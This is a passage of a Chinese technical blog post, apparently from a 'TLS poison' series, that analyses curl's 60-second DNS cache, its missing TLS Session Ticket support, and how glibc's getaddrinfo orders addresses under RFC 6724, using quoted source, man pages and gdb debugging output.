class="line">      <span class="hljs-comment">/* ask the callback function if we shall remove this entry or not */</span></span><br><span class="line">      <span class="hljs-keyword">if</span>(comp == <span class="hljs-literal">NULL</span> || comp(user, he-&gt;ptr)) {</span><br><span class="line">        Curl_llist_remove(<span class="hljs-built_in">list</span>, le, (<span class="hljs-keyword">void</span> *) h);</span><br><span class="line">        --h-&gt;<span class="hljs-built_in">size</span>; <span class="hljs-comment">/* one less entry in the hash now */</span></span><br><span class="line">      }</span><br><span class="line">      le = lnext;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">/*</span></span><br><span class="line"><span class="hljs-comment"> * This function is set as a callback to be called for every entry in the DNS</span></span><br><span class="line"><span class="hljs-comment"> * cache when we want to prune old unused entries.</span></span><br><span class="line"><span class="hljs-comment"> *</span></span><br><span class="line"><span class="hljs-comment"> * Returning non-zero means remove the entry, return 0 to keep it in the</span></span><br><span class="line"><span class="hljs-comment"> * cache.</span></span><br><span class="line"><span class="hljs-comment"> */</span></span><br><span class="line"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span></span><br><span class="line">hostcache_timestamp_remove(<span class="hljs-keyword">void</span> *datap, <span class="hljs-keyword">void</span> *hc)</span><br><span class="line">{</span><br><span class="line">  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hostcache_prune_data</span> *<span class="hljs-title">data</span> =</span></span><br><span class="line"><span class="hljs-class">    (<span class="hljs-title">struct</span> <span class="hljs-title">hostcache_prune_data</span> *) <span class="hljs-title">datap</span>;</span></span><br><span class="line">  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Curl_dns_entry</span> *<span class="hljs-title">c</span> = (<span class="hljs-title">struct</span> <span class="hljs-title">Curl_dns_entry</span> *) <span class="hljs-title">hc</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">return</span> (<span class="hljs-number">0</span> != c-&gt;timestamp)</span><br><span class="line">    &amp;&amp; (data-&gt;now - c-&gt;timestamp &gt;= data-&gt;cache_timeout);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>在这里一切真相大白，正如代码所示，在<code>hostcache_timestamp_remove</code>中会使用现在的时间与 curl 哈希表中记录的时间相减，结果是否大于<code>data-&gt;cache_timeout</code>，在这里也就是默认的 60s ，如果大于则在<code>Curl_hash_clean_with_criterium</code>清空对应的哈希表，接着 curl 才会进行下一次真正的 DNS 查询。</p><p>所以，从代码层面来看，如果没有用户特殊配置， curl 会自己维护一个 DNS 哈希表，其中的记录过期时间为 60s 。</p><p>官网文档也有过相关说明 <a href="https://curl.se/libcurl/c/CURLOPT_DNS_CACHE_TIMEOUT.html" target="_blank" rel="noopener">CURLOPT_DNS_CACHE_TIMEOUT explained</a> ，其中描述如下：</p><blockquote><p>​    Pass a long, this sets the timeout in seconds. Name resolves will be kept in memory and used for this number of seconds. Set to zero to completely disable caching, or set to -1 to make the cached entries remain forever. By default, libcurl caches this info for 60 seconds.</p><p>The name resolve functions of various libc implementations don’t re-read name server information unless explicitly told so (for example, by calling <em>res_init(3)</em>). This may cause libcurl to keep using the older server even if DHCP has updated the server info, and this may look like a DNS cache issue to the casual libcurl-app user.</p><p>Note that DNS entries have a “TTL” property but libcurl doesn’t use that. This DNS cache timeout is entirely speculative that a name will resolve to the same address for a certain small amount of time into the future.</p></blockquote><p>更一步说明了， curl 完全忽视得到的 DNS 查询得到的 TTL 缓存时间，使用自己的 DNS 缓存策略。虽然 curl 没有守护进程等什么手段的来维护自己的 DNS 哈希表，但是为了解决在复杂网络请求时避免过多 DNS 请求，还是选择了每次使用一个哈希表来优化。其主要的设计思路主要基于两层缓存，第一层缓存由系统决定，也就是通过<code>getaddrinfo</code>获取，如果这时候过期了则由系统去获取 DNS 记录，如果没有过期则直接使用系统的 DNS 记录；第二层就是 curl 自己的 DNS 哈希表，在进行多次请求时能体现出使用自己哈希表的优势，进一步省去了从系统获取 DNS 记录的时间。当然还有一种可能就是为了在特定场合在一定程度上缓解 DNS Rebinding 的攻击。</p><h3 id="cURL-Session-Ticket"><a href="#cURL-Session-Ticket" class="headerlink" title="cURL Session Ticket"></a>cURL Session Ticket</h3><p>关于 Session Ticket ，虽然该标准有很多的优点，主要实现了 Stateless 的特点，减缓了服务器的负载压力，但是似乎 curl with openSSL 并不打算支持 Session Ticket 这一 extension 。</p><p>虽然曾经有人尝试在 curl 中支持这一 TLS 1.2 的特性，但是根据 <a href="https://curl.se/mail/lib-2019-08/0056.html" target="_blank" rel="noopener">Re: Question about SSL Session Tickets</a> 当中的讨论，<a href="https://github.com/curl/curl/pull/3060" target="_blank" rel="noopener">TLS Session ticket support</a> 构建的 curl 并不可以正常的使用，所以当时被 curl 官方人员放弃了该 PR Merged ，之后也没有再打算支持这一特性了，当然也没有在 curl 的 <a href="https://curl.se/docs/todo.html" target="_blank" rel="noopener">TODO</a> 看到相关的支持计划了。当然如果你非常倾向于使用 CLI 工具去实验该特性，可以尝试使用 openssl s_client 或者 curl build with GnuTLS ，他们都支持这一特性。</p><p>以下是在互联网上一些关于 curl 支持 TLS 1.2 Session Ticket 的讨论：</p><p><a href="https://curl.se/mail/lib-2019-08/0056.html" target="_blank" rel="noopener">https://curl.se/mail/lib-2019-08/0056.html</a></p><p><a href="https://github.com/curl/curl/issues/3202" target="_blank" rel="noopener">https://github.com/curl/curl/issues/3202</a></p><p><a href="https://github.com/curl/curl/pull/2220" target="_blank" rel="noopener">https://github.com/curl/curl/pull/2220</a></p><p><a href="https://github.com/curl/curl/issues/1109#issuecomment-274346447" target="_blank" rel="noopener">https://github.com/curl/curl/issues/1109#issuecomment-274346447</a></p><p><a href="https://stackoverflow.com/questions/19939247/ssl-session-tickets-vs-session-ids" target="_blank" rel="noopener">https://stackoverflow.com/questions/19939247/ssl-session-tickets-vs-session-ids</a></p><h3 id="IP-Sort-IN-cURL"><a href="#IP-Sort-IN-cURL" class="headerlink" title="IP Sort IN cURL"></a>IP Sort IN cURL</h3><p>好了，接下来就是对于 IP 选择的问题了，前面我们说过 curl 在获取 DNS 记录的时候，使用的是<code>getaddrinfo</code>函数，该函数位于 glibc 当中，为了弄清楚这个函数对于 IP 选择的问题，我一个 Web 选手也只能硬着头皮去调试 glibc 了，何时受过这个苦！下面就是在调试 glibc 2.31 过程当中的一些记录与结果。</p><p>从 <a href="https://man7.org/linux/man-pages/man3/getaddrinfo.3.html" target="_blank" rel="noopener">getaddrinfo</a> 的手册中，我们可以了解到：</p><blockquote><p>​    Given node and service, which identify an Internet host and a service, getaddrinfo() returns one or more addrinfo structures, each of which contains an Internet address that can be specified in a call to bind(2) or connect(2). The getaddrinfo() function combines the functionality provided by the gethostbyname(3) and getservbyname(3) functions into a single interface, but unlike the latter functions, getaddrinfo() is reentrant and allows programs to eliminate IPv4-versus-IPv6 dependencies.</p></blockquote><p>其函数功能主要是用来查询给定域名对应的 IP ，用来替代之前的<code>gethostbyname</code>与<code>getservbyname</code>函数，并且均支持 IPv4 与 IPv6 。在手册中，我们还可以看到如下描述：</p><blockquote><p>​    There are several reasons why the linked list may have more than one addrinfo structure, including: the network host is multihomed, accessible over multiple protocols (e.g., both AF_INET and AF_INET6); or the same service is available from multiple socket types (one SOCK_STREAM address and another SOCK_DGRAM address, for example). Normally, the application should try using the addresses in the order in which they are returned. The sorting function used within getaddrinfo() is defined in RFC 3484; the order can be tweaked for a particular system by editing /etc/gai.conf (available since glibc 2.5).</p></blockquote><p>以及在其配置文件 <a href="https://man7.org/linux/man-pages/man5/gai.conf.5.html" target="_blank" rel="noopener">gai.conf</a> 帮助文档当中也可以看到如下描述：</p><blockquote><p>​    A call to getaddrinfo(3) might return multiple answers. According to RFC 3484 these answers must be sorted so that the answer with the highest success rate is first in the list. The RFC provides an algorithm for the sorting. The static rules are not always adequate, though. For this reason, the RFC also requires that system administrators should have the possibility to dynamically change the sorting. For the glibc implementation, this can be achieved with the /etc/gai.conf file. Each line in the configuration file consists of a keyword and its parameters. White spaces in any place are ignored. Lines starting with ‘#’ are comments and are ignored.</p></blockquote><p>也就是说，<code>getaddrinfo</code>函数会使用 gai.conf 以及 RFC 3484 来对其得到的结果进行排序，而 gai.conf 文件中的可以由用户手动配置，我们暂且搁置，先来看看这个传说中的 RFC 3484 所描述的规则。这里我们需要注意的是， RFC 3484 已经被 RFC 6724 取代，So let’s take a look at the RFC 6724.</p><p>在 <a href="https://tools.ietf.org/html/rfc6724" target="_blank" rel="noopener">RFC 6724</a> 的介绍中，我们可以看到如下的描述：</p><blockquote><p>​    For example, when DNS name resolution yields both IPv6 and IPv4 addresses and the network protocol stack has available both IPv6 and IPv4 source addresses. In such cases, a simple policy to always prefer IPv6 or always prefer IPv4 can produce poor behavior. As one example, suppose a DNS name resolves to a global IPv6 address and a global IPv4 address. If the node has assigned a global IPv6 address and a 169.254/16 auto-configured IPv4 address [9], then IPv6 is the best choice for communication. But if the node has assigned only a link-local IPv6 address and a global IPv4 address, then IPv4 is the best choice for communication. The destination address selection algorithm solves this with a unified procedure for choosing among both IPv6 and IPv4 addresses.</p></blockquote><p>这里正好举了一个例子，例如当 DNS 解析同时产生 IPv6 和 IPv4 地址，而网络协议栈同时拥有 IPv6 和 IPv4 源地址时，在这种情况下，一个简单的策略，即总是优先选择 IPv6 或总是优先选择 IPv4 ，可能会产生不良行为。举个例子，假设一个 DNS 解析到一个全局 IPv6 地址和一个全局 IPv4 地址，如果节点已经分配了一个全局 IPv6 地址和一个 169.254/16 自动配置的 IPv4 地址，那么 IPv6 是通信的最佳选择。但如果节点只分配了一个链路本地 IPv6 地址和一个全局 IPv4 地址，那么 IPv4 是通信的最佳选择。目的地址选择算法解决了这一问题，在 IPv6 和 IPv4 地址中进行统一的选择。</p><p>这个介绍看起来似乎正是我们需要的，能帮助我们解决对于两个 IP 的排序问题。在大概通读这篇 RFC 后，该 RFC 主要提出了几种地址选择算法，包括源地址选择算法、目的地址选择算法等，能够帮助我们解决很多平时的疑惑，比如有多个源 IP 为什么使用其中一个特定的源 IP 等，个人建议如果有类似关于网络通信疑问或者需要了解网络通信内容的同学可以进一步学习一下该 RFC 。这里我们需要关注的是主要是目的地址选择算法，不会介绍其他算法，并且也只是做个简单介绍。</p><p>对于目的地址选择算法需要按顺序遵守十条规则，并且只要前任一规则起到排序作用，则后续规则不起作用。下文以 DS 表示 Destination S 。</p><ul><li>规则1：避免不可用的目的地。如果已知 DB 是不可到达的，或者如果 Source(DB) 是未定义的，那么首选DA。同理，如果已知 DA 是不可到达的，或者 Source(DA) 是未定义的，那么首选 DB 。</li><li>规则2：优先选择匹配的范围。如果 Scope(DA) = Scope(Source(DA)) ，且 Scope(DB) &lt;&gt; Scope(Source(DB)) ，则优先选择 DA 。同理，如果 Scope(DA) &lt;&gt; Scope(Source(DA)) ，且Scope(DB) = Scope(Source(DB)) ，则优先选择DB。</li><li>规则3：避免使用废弃的地址。如果 Source(DA) 被弃用而 Source(DB) 没有被弃用，那么首选 DB 。同理，如果 Source(DA) 没有被废弃，而 Source(DB) 被废弃，那么优先选择 DA 。</li><li>规则4：优先选择家庭地址。如果 Source(DA) 同时是家庭地址和照顾地址，而 Source(DB) 不是，那么首选 DA 。同理，如果 Source(DB) 同时是家庭地址和照顾地址，而 Source(DA) 不是，那么首选DB。如果 Source(DA) 只是一个家庭地址，而 Source(DB) 只是一个照顾地址，那么就选择 DA 。同理，如果 Source(DA) 只是一个照顾地址，而 Source(DB) 只是一个家庭地址，那么首选 DB 。</li><li>规则5：优先选择匹配的标签。如果 Label(Source(DA))=Label(DA) 且 Label(Source(DB)) &lt;&gt; Label(DB) ，则首选 DA 。同理，如果 Label(Source(DA)) &lt;&gt;Label(DA) ，且Label(Source(DB))=Label(DB)，则优先选择 DB 。</li><li>规则6：优先选择较高的优先级。如果 Precedence(DA)&gt; Precedence(DB) ，则优先选择 DA 。同理，如果 Precedence(DA) &lt; Precedence(DB) ，则优先选择 DB 。</li><li>规则7：优先选择本地传输。如果 DA 是通过封装过渡机制（如IPv4中的IPv6）达到的，而 DB 不是，那么优先选择 DB 。同理，如果 DB 是通过封装到达，而 DA 不是，那么优先选择 DA  。</li><li>规则8：优先选择较小的范围。如果 Scope(DA) &lt; Scope(DB) ，则首选 DA 。同样，如果Scope(DA)&gt;Scope(DB) ，则选择 DB 。</li><li>规则9：使用最长的匹配前缀。当DA和DB属于同一个地址族（都是IPv6或都是IPv4）。如果CommonPrefixLen(Source(DA), DA) &gt; CommonPrefixLen(Source(DB), DB)，则首选DA。同理，如果CommonPrefixLen(Source(DA), DA) &lt; CommonPrefixLen(Source(DB)，DB)，则优先选择DB。</li><li>规则10：否则，保持顺序不变。如果DA在原列表中先于DB，则优先选择DA。否则，优先选择DB。</li><li>如果执行有其他方法对目的地地址进行排序，规则9和10可以被取代。例如，如果实施机构知道哪些目的地址会带来 “最佳 “的通信性能，则规则9和10可以被取代。</li></ul><p>更简单来说遵守以下规则：</p><ul><li>避免使用不可用的目的地址。如果一个地址是可到达的（堆栈有通往特定地址的路由），而另一个地址是不可到达的，那么将可到达的目的地址放在不可到达的地址之前。</li><li>优先选择匹配的范围。如果一个地址的作用域与其源地址的作用域相匹配，而另一个地址不符合这个标准，那么就把作用域相匹配的地址放在另一个目的地址之前。</li><li>目的地址及其相关的源地址的范围由地址的高阶位决定。目的地址可以是多播地址或单播地址。为了比较范围，单播链路本地地址被映射到多播链路本地地址，单播全局地址被映射到多播全局地址。</li><li>避免使用废弃的地址。如果一个地址是废弃的，而另一个地址是非废弃的，那么非废弃的地址放在另一个地址之前。</li><li>优先选择匹配的标签。如果一个目标地址的标签与其关联的源地址的标签相匹配，而另一个目标地址的标签与其关联的源地址的标签不相匹配，那么具有匹配标签的目标地址被放在另一个地址之前。有关标签如何与目标地址关联的信息，请参见IPv6默认地址选择的策略表和配置默认地址选择的策略表。</li><li>优先选择较高的优先级。如果一个地址的优先级高于另一个地址的优先级，那么优先级较高的地址将被放在另一个目标地址之前。请参阅 <a href="https://www.ibm.com/support/knowledgecenter/SSLTBW_2.3.0/com.ibm.zos.v2r3.hale001/ipv6_c_address_policy_table.htm?view=kc" target="_blank" rel="noopener">IPv6默认地址选择的策略表</a> 和 <a href="https://www.ibm.com/support/knowledgecenter/SSLTBW_2.3.0/com.ibm.zos.v2r3.hale001/ipv6_t_configuring_address_policy_table.htm?view=kc" target="_blank" rel="noopener">配置默认地址选择的策略表</a>，以了解更多关于优先级值如何与目的地址关联的信息。</li><li>优先范围较小。如果一个地址的作用域小于另一个地址的作用域，则作用域较小的地址放在另一个目的地址之前。</li><li>使用最长的匹配前缀。如果一个目标地址与其关联的源地址的 CommonPrefixLength 比另一个目标地址与其源地址的 CommonPrefixLength 长，那么 CommonPrefixLength 长的地址放在另一个地址之前。</li><li>保持顺序不变。没有规则选择这两个地址中较好的地址，则它们选择权重相等。选择第一个地址作为这两个地址中较好的地址，顺序不变。</li></ul><p>我认为 RFC 决定了代码<strong>应该</strong>怎么去执行，但是终究还是代码决定了怎么去执行。（纯粹是我也没怎么看懂</p><p>于是，我们可以在这里找到<code>getaddrinfo</code>函数的实现：<a href="https://code.woboq.org/userspace/glibc/sysdeps/posix/getaddrinfo.c.html#2479" target="_blank" rel="noopener">https://code.woboq.org/userspace/glibc/sysdeps/posix/getaddrinfo.c.html#2479</a> ，关键点就在这，可以看到在<code>getaddrinfo</code>函数拿到结果后使用了<code>rfc3484_sort</code>对结果进行排序：</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/* We got all the source addresses we can get, now sort using</span></span><br><span class="line"><span class="hljs-comment">   the information.  */</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sort_result_combo</span> <span class="hljs-title">src</span></span></span><br><span class="line"><span class="hljs-class">  = {</span> .results = results, .nresults = nresults };</span><br><span class="line"><span class="hljs-keyword">if</span> (__glibc_unlikely (gaiconf_reload_flag_ever_set))</span><br><span class="line">  {</span><br><span class="line">    __libc_lock_define_initialized (<span class="hljs-keyword">static</span>, lock);</span><br><span class="line">    __libc_lock_lock (lock);</span><br><span class="line">    <span class="hljs-keyword">if</span> (__libc_once_get (old_once) &amp;&amp; gaiconf_reload_flag)</span><br><span class="line">      gaiconf_reload ();</span><br><span class="line">    __qsort_r (order, nresults, <span class="hljs-keyword">sizeof</span> (order[<span class="hljs-number">0</span>]), rfc3484_sort, &amp;src);</span><br><span class="line">    __libc_lock_unlock (lock);</span><br><span class="line">  }</span><br><span class="line"><span class="hljs-keyword">else</span></span><br><span class="line">  __qsort_r (order, nresults, <span class="hljs-keyword">sizeof</span> (order[<span class="hljs-number">0</span>]), rfc3484_sort, &amp;src);</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>rfc3484_sort</code>函数主要实现对应了 RFC 6742 当中的十条规则：</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span></span><br><span class="line">rfc3484_sort (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *p1, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *p2, <span class="hljs-keyword">void</span> *arg)</span><br><span class="line">{</span><br><span class="line">  <span class="hljs-comment">//...代码段过长这里省略</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-comment">/* Rule 10: Otherwise, leave the order unchanged.  To ensure this</span></span><br><span class="line"><span class="hljs-comment">     compare with the value indicating the order in which the entries</span></span><br><span class="line"><span class="hljs-comment">     have been received from the services.  NB: no two entries can have</span></span><br><span class="line"><span class="hljs-comment">     the same order so the test will never return zero.  */</span></span><br><span class="line">  <span class="hljs-keyword">return</span> idx1 &lt; idx2 ? <span class="hljs-number">-1</span> : <span class="hljs-number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>rfc3484_sort</code>的函数执行完后，回调到<code>__qsort_r</code>，也就是<code>qsort_r</code></p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __qsort_r qsort_r</span></span><br><span class="line"></span><br><span class="line">__qsort_r (order, nresults, <span class="hljs-keyword">sizeof</span> (order[<span class="hljs-number">0</span>]), rfc3484_sort, &amp;src);</span><br></pre></td></tr></tbody></table></figure><p></p><p>接着查阅手册，我们可以看到 <a href="https://linux.die.net/man/3/qsort_r" target="_blank" rel="noopener">qsort_r</a> 函数的描述：</p><blockquote><p><strong>Synopsis</strong></p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">qsort</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *base, <span class="hljs-keyword">size_t</span> nmemb, <span class="hljs-keyword">size_t</span> <span class="hljs-built_in">size</span>,</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">int</span> (*compar)(<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *))</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">qsort_r</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *base, <span class="hljs-keyword">size_t</span> nmemb, <span class="hljs-keyword">size_t</span> <span class="hljs-built_in">size</span>,</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">int</span> (*compar)(<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *, <span class="hljs-keyword">void</span> *),</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">void</span> *arg)</span></span>;</span><br></pre></td></tr></tbody></table></figure><p></p><p>Feature Test Macro Requirements for glibc (see <strong><a href="https://linux.die.net/man/7/feature_test_macros" target="_blank" rel="noopener">feature_test_macros</a></strong>(7)):</p><ul><li><strong>qsort_r</strong>(): _GNU_SOURCE</li></ul><p><strong>Description</strong></p><p>The <strong>qsort</strong>() function sorts an array with <em>nmemb</em> elements of size <em>size</em>. The <em>base</em> argument points to the start of the array.</p><p>The contents of the array are sorted in ascending order according to a comparison function pointed to by <em>compar</em>, which is called with two arguments that point to the objects being compared.</p><p>The comparison function must return an integer less than, equal to, or greater than zero if the first argument is considered to be respectively less than, equal to, or greater than the second. If two members compare as equal, their order in the sorted array is undefined.</p><p>The <strong>qsort_r</strong>() function is identical to <strong>qsort</strong>() except that the comparison function <em>compar</em> takes a third argument. A pointer is passed to the comparison function via <em>arg</em>. In this way, the comparison function does not need to use global variables to pass through arbitrary arguments, and is therefore reentrant and safe to use in threads.</p></blockquote><p>从中我们可以明白，<code>qsort_r</code> 函数是返回升序的数组结果，并且对于使用的比较函数的返回值是否大于零来决定传递的参数大小，如果返回值大于零，意思就是第一个参数需要排在第二个参数之后。</p><p>接下来我们就具体来调试一下这个函数吧，期间 setup 等调试 glibc 并非本文范围，而且网络也有比较多的文章，这里就不再做记录。</p><p>这里我们以一个 A 记录为 127.0.0.1 ，另一个 A 记录为我其中一个 VPS 地址为例子，具体来看看这个函数的主要判断形式。 gbd 直接下断点到<code>rfc3484_sort</code>，在进入到函数后，我们可以通过以下形式查看相应的地址：</p><p></p><figure class="highlight livescript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-params">(gdb)</span> <span class="hljs-title">p</span> <span class="hljs-params">((struct sockaddr_in*)((*a1-&gt;dest_addr)-&gt;ai_addr))</span>-&gt;</span>sin_addr</span><br><span class="line">$<span class="hljs-number">3</span> = {s_addr = <span class="hljs-number">3183758381</span>}</span><br><span class="line"><span class="hljs-function"><span class="hljs-params">(gdb)</span> <span class="hljs-title">p</span> <span class="hljs-params">((struct sockaddr_in*)((*a2-&gt;dest_addr)-&gt;ai_addr))</span>-&gt;</span>sin_addr</span><br><span class="line">$<span class="hljs-number">4</span> = {s_addr = <span class="hljs-number">16777343</span>}</span><br></pre></td></tr></tbody></table></figure><p></p><p>得到 a1 与 a2 代表的地址后，转成十进制后再倒叙一下，即 a2 代表的是 127.0.0.1 ， a1 代表的是我们真正 vps 的地址。然后通过 gdb 单步执行，我们在 Rule 8 的时候跳出了<code>rfc3484_sort</code>函数:</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/* Rule 8: Prefer smaller scope.  */</span></span><br><span class="line"><span class="hljs-keyword">if</span> (a1_dst_scope &lt; a2_dst_scope)</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;</span><br><span class="line"><span class="hljs-keyword">if</span> (a1_dst_scope &gt; a2_dst_scope)</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part3/1.png" alt=""></p><p>跳出<code>rfc3484_sort</code>进入到 <code>qsort_r</code> 函数，也就是在此处执行完比较就直接返回到了<code>qsort</code>函数，并且从执行结果来看，是因为 <code>a1_dst_scope &gt; a2_dst_scope</code> 比较结果执行了<code>return 1</code>。所以按照<code>qsort</code>函数文档说明，如果返回了一个大于 0 的值，则说明要将第一个参数需要排在第二个参数之后，这里 a1 代表的我们的 vps 地址需要排在 a2 代表的 127.0.0.1 地址之后，所以经过<code>rfc3484_sort</code>函数返回的顺序则是 127.0.0.1 作为首选地址，VPS 地址其次。</p><p>于是我接下来依次对 IPv4 当中各种排列组合进行了测试：</p><ul><li><p>a1 127.0.0.1 vs a2 0.0.0.0。适用于 scope 判断，127 优先</p></li><li><p>a1 ipv4 vps vs a2 0.0.0.0。适用于 scope 判断，ipv4 vps 优先</p></li><li><p>a1  169.254.1.1 vs a2 0.0.0.0。适用于 scope 判断，169 优先</p></li><li><p>a1 127.0.0.1 vs a2 169.254.0。适用于 scope 判断，127 优先</p></li><li><p>a1 ipv4 vps vs a2 ipv4 vps。并不适用任何判断，函数执行完成返回 -1 